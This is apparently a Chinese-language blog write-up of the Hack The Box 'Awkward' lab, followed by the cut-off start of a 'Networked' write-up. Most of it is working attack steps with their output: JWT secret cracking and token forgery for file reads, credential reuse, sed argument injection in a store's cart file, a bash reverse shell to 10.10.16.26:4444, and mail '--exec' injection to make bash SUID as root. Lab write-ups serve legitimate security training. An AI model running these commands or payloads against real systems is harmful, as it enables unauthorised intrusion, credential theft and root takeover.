eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8 然后使用 john 进行破解 ┌──(root㉿kali)-[~/Desktop] └─# john jwt --wordlist=/usr/share/wordlists/rockyou.txt -format=HMAC-SHA256 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 123beany123 (?) 1g 0:00:00:03 DONE (2023-03-12 00:54) 0.3076g/s 4102Kp/s 4102Kc/s 4102KC/s 123erix..123P45 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. 得到了密钥 然后我们去 jwt.io 进行 cookie 的伪造 得到了 cookie eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk 然后我们用 burp 抓包一个访问 &#x2F;api&#x2F;all-leave 的请求，然后把 cookie 替换为我们制作的 成功利用 我这个人比较懒，所以现在我们来构造一下命令行的 curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot; ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:102:105::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin syslog:x:104:111::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin whoopsie:x:117:124::/nonexistent:/bin/false sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin saned:x:121:128::/var/lib/saned:/usr/sbin/nologin colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false sshd:x:130:65534::/run/sshd:/usr/sbin/nologin _laurel:x:999:999::/var/log/laurel:/bin/false 利用成功，现在我们来筛选一下哪些用户可以被我们利用 ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot;|grep bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3059 100 3059 0 0 11835 0 --:--:-- --:--:-- --:--:-- 11856 root:x:0:0:root:/root:/bin/bash bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash 可以被我们利用的有三个，root、bean、christine，很明显 root 可以排除掉，那我们来尝试请求一下剩下两个的 ssh 密钥试试 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A 去尝试一下 curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot; curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot; ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot; Failed to retrieve leave requests ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot; Failed to retrieve leave requests 都失败了，那我们去获取一下 .bashrc 文件试试 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot; ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot; # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don&#39;t do anything case $- in *i*) ;; *) return;; esac # don&#39;t put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don&#39;t overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern &quot;**&quot; used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot; # set variable identifying the chroot you work in (used in the prompt below) if [ -z &quot;${debian_chroot:-}&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we &quot;want&quot; color) case &quot;$TERM&quot; in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n &quot;$force_color_prompt&quot; ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it&#39;s compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ &quot;$color_prompt&quot; = yes ]; then PS1=&#39;${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#39; else PS1=&#39;${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ &#39; fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case &quot;$TERM&quot; in xterm*|rxvt*) PS1=&quot;\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1&quot; ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot; alias ls=&#39;ls --color=auto&#39; #alias dir=&#39;dir --color=auto&#39; #alias vdir=&#39;vdir --color=auto&#39; alias grep=&#39;grep --color=auto&#39; alias fgrep=&#39;fgrep --color=auto&#39; alias egrep=&#39;egrep --color=auto&#39; fi # colored GCC warnings and errors #export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39; # some more ls aliases alias ll=&#39;ls -alF&#39; alias la=&#39;ls -A&#39; alias l=&#39;ls -CF&#39; # custom alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39; # Add an &quot;alert&quot; alias for long running commands. Use like so: # sleep 10; alert alias alert=&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;\\&#39;&#39;s/^\\s*[0-9]\\+\\s*//;s/[;&amp;|]\\s*alert$//&#39;\\&#39;&#39;)&quot;&#39; # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don&#39;t need to enable # this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi # custom alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39; 我们找到了一个 alias，还有一个 hash 脚本 /home/bean/Documents/backup_home.sh eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0 curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot; ┌──(root㉿kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot; #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude=&#39;.npm&#39; --exclude=&#39;.cache&#39; --exclude=&#39;.vscode&#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date &gt; /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp 我们去下载这个文件 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip ┌──(root㉿kali)-[~/Desktop/bean] └─# curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 31716 100 31716 0 0 61542 0 --:--:-- --:--:-- --:--:-- 61584 ┌──(root㉿kali)-[~/Desktop/bean] └─# ls bean_backup_final.zip ┌──(root㉿kali)-[~/Desktop/bean] └─# unzip bean_backup_final.zip Archive: bean_backup_final.zip End-of-central-directory signature not found. Either this file is not a zipfile, or it constitutes one disk of a multi-part archive. In the latter case the central directory and zipfile comment will be found on the last disk(s) of this archive. unzip: cannot find zipfile directory in one of bean_backup_final.zip or bean_backup_final.zip.zip, and cannot find bean_backup_final.zip.ZIP, period. 将文件解压出来 ┌──(root㉿kali)-[~/Desktop/bean] └─# ls -la 总计 68 drwxr-xr-x 6 root root 4096 3月12日 01:26 . drwxr-xr-x 3 root root 4096 3月12日 01:17 .. lrwxrwxrwx 1 lucifiel lucifiel 9 9月15日 19:40 .bash_history -&gt; /dev/null -rw-r--r-- 1 lucifiel lucifiel 220 9月15日 19:34 .bash_logout -rw-r--r-- 1 lucifiel lucifiel 3847 9月15日 19:45 .bashrc -rw-r--r-- 1 root root 31716 3月12日 01:26 bean_backup_final.zip drwxr-xr-x 12 root root 4096 3月12日 01:24 .config drwxr-xr-x 2 root root 4096 3月12日 01:24 .gnupg drwxr-xr-x 3 root root 4096 3月12日 01:24 .local -rw-r--r-- 1 lucifiel lucifiel 807 9月15日 19:34 .profile drwx------ 2 lucifiel lucifiel 4096 9月15日 19:36 .ssh 这是解压出来的文件 ┌──(root㉿kali)-[~/Desktop/bean/.config/xpad] └─# cat content-DS1ZS1 TO DO: - Get real hat prices / stock from Christine - Implement more secure hashing mechanism for HR system - Setup better confirmation message when adding item to cart - Add support for item quantity &gt; 1 - Implement checkout system boldHR SYSTEM/bold bean.hill 014mrbeanrules!#P https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold 在 bean&#x2F;.config&#x2F;xpad&#x2F;content-DS1ZS1 中找到了 bean 的密码 username = bean.hill password = 014mrbeanrules!#P 尝试使用 bean 去登录 ssh ┌──(root㉿kali)-[~/Desktop] └─# ssh bean@10.10.11.185 The authenticity of host &#39;10.10.11.185 (10.10.11.185)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:iXn1BLzsoL4oHP9bO/v5F/CKp7pdoku6nopTeJlvR3U. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.185&#39; (ED25519) to the list of known hosts. bean@10.10.11.185&#39;s password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 12 01:59:31 2023 from 10.10.14.68 bean@awkward:~$ whoami&amp;&amp;id bean uid=1001(bean) gid=1001(bean) groups=1001(bean) 成功登录到 user 用户 bean@awkward:~$ cat user.txt 5005243124dea7c1f14fc7d933ef2946 成功拿到 user 用户的 flag 文件 权限提升还记得我们的子域名 store 吗？ 在 burp 中的时候显示该页面来自 nginx 服务器，让我们看一下 shell 中的 nginx 配置文件 bean@awkward:~$ cd /etc/nginx/conf.d/ bean@awkward:/etc/nginx/conf.d$ ls -la total 12 drwxr-xr-x 2 root root 4096 Sep 15 22:34 . drwxr-xr-x 8 root root 4096 Oct 6 00:49 .. -rw-r--r-- 1 root root 44 Sep 15 22:34 .htpasswd bean@awkward:/etc/nginx/conf.d$ cat .htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 我们使用 john 去跑一下 ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot; Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:30 DONE (2023-03-12 01:34) 0g/s 156319p/s 156319c/s 156319C/s ejngyhga007..*7¡Vamos! Session completed. 然而并没有结果 然而我突然想起来 content-DS1ZS1 文件底部有一句注释 boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold 大概意思就是让我们导出尝试一下 username = admin password = 014mrbeanrules!#P 使用 bean 的代码前往 http://store.hat-valley.htb/ 登录 admin 账户成功 这很明显是 Hat Valley 的在线商店。我们去查看一下代码 bean@awkward:/var/www/store$ ls -la total 104 drwxr-xr-x 9 root root 4096 Oct 6 01:35 . drwxr-xr-x 7 root root 4096 Oct 6 01:35 .. drwxrwxrwx 2 root root 4096 Mar 12 01:30 cart -rwxr-xr-x 1 root root 3664 Sep 15 20:09 cart_actions.php -rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php -rwxr-xr-x 1 root root 9143 Sep 15 20:09 checkout.php drwxr-xr-x 2 root root 4096 Oct 6 01:35 css drwxr-xr-x 2 root root 4096 Oct 6 01:35 fonts drwxr-xr-x 6 root root 4096 Oct 6 01:35 img -rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php drwxr-xr-x 3 root root 4096 Oct 6 01:35 js drwxrwxrwx 2 root root 4096 Mar 12 04:30 product-details -rwxr-xr-x 1 root root 918 Sep 15 20:09 README.md -rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php drwxr-xr-x 6 root root 4096 Oct 6 01:35 static -rwxr-xr-x 1 root root 695 Sep 15 20:09 style.css bean@awkward:/var/www/store$ cat README.md # Hat Valley - Shop Online! ### To Do 1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup 2. Implement checkout system, link with credit card system (Stripe??) 3. Implement shop filter 4. Get full catalogue of items ### How to Add New Catalogue Item 1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID 2. Change the fields to the appropriate values and save the file. -- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. -- ### Hat Valley Cart Right now, the user&#39;s cart is stored within /cart, and is named according to the user&#39;s session ID. All products are appended to the same file for each user. To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website! README.md 告诉我们文件正离线存储在 &#x2F;product-details 和 &#x2F;cart 中 在文件 cart_actions.php 中的一段代码 if(checkValidItem(&quot;{$STORE_HOME}cart/{$user_id}&quot;)) { system(&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;); echo &quot;Item removed from cart&quot;; } else { echo &quot;Invalid item&quot;; } exit; 这不就有了 这段中的 sed 命令是用于从购物车文件中删除数据 我们可以利用这个代码来进行远程代码执行 首先我们需要一个 Reverse Shell echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1&quot; &gt;&gt; /tmp/shell.sh chmod 777 /tmp/shell.sh bean@awkward:/var/www/store/cart$ cat /tmp/shell.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1 nc -nvlp 4444 然后接着我们将产品添加到购物车 然后修改一下参数，加入下面的参数 1/&#39;+-e+&quot;1e+/tmp/shell.sh&quot;+/tmp/shell.sh+&#39; 然后我们需要修改在 &#x2F;cart 中创建的文件，不幸的是我们没有操作权限，所以我们选择删除这个文件，然后自己创建一个 bean@awkward:/var/www/store/cart$ ls b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cp b1b9-7006-2d9-74bc bak bean@awkward:/var/www/store/cart$ rm -rf b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cp bak b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ vi b1b9-7006-2d9-74bc bean@awkward:/var/www/store/cart$ cat b1b9-7006-2d9-74bc ***Hat Valley Cart*** item_id=1&#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 然后我们抓一个删除商品的包 修改好以后执行 这边拿到的是 www-data 的权限 去执行一下 pspy 当有新的请假请求的时候，会调用 mail 命令拼接对应 csv 文件中的 name 2023/03/12 05:12:09 CMD: UID=0 PID=74503 | mail -s Leave Request: christopher.jones christine www-data@awkward:/tmp$ cat exploit.sh #!/bin/bash chmod +s /bin/bash www-data@awkward:/tmp$ chmod 777 exploit www-data@awkward:/tmp$ cd /var/www/private www-data@awkward:~/private$ echo &#39;&quot; --exec=&quot;\\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv &lt;&quot; --exec=&quot;\\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv www-data@awkward:~/private$ ls -la /bin/bash ls -la /bin/bash -rwsr-sr-x 1 root root 1396520 Jan 7 2022 /bin/bash www-data@awkward:~/private$ /bin/bash -p /bin/bash -p whoami&amp;&amp;id root uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) 成功提权到 root 权限 cat /root/root.txt 5d3d649dfbaf5f418cdca5f79012eafa 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Networked - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Networked","date":"2023-03-06T11:38:36.000Z","updated":"2023-06-13T03:47:23.000Z","comments":true,"path":"2023/03/06/Hackthebox/Easy/Hackthebox-Networked/","link":"","permalink":"http://www.lucifiel.com/2023/03/06/Hackthebox/Easy/Hackthebox-Networked/","excerpt":"","text":"Hackthebox - Networked靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 19:52 CST Nmap scan report for 10.10.10.146 Host is up (0.11s latency). Not shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (92%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 4.10 (90%), Linux 4.4 (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%), Linux 3.18 (90%), Linux 3.2 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 87.93 ms 10.10.16.1 2 132.57 ms 10.10.10.146 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds Http 似乎是说这个网站还在做，我们去做个 fuzz 看看 Fuzz┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.10.146/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.146/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 229, Words: 33, Lines: 9, Duration: 89ms] uploads [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 9426ms] backup [Status: 301, Size: 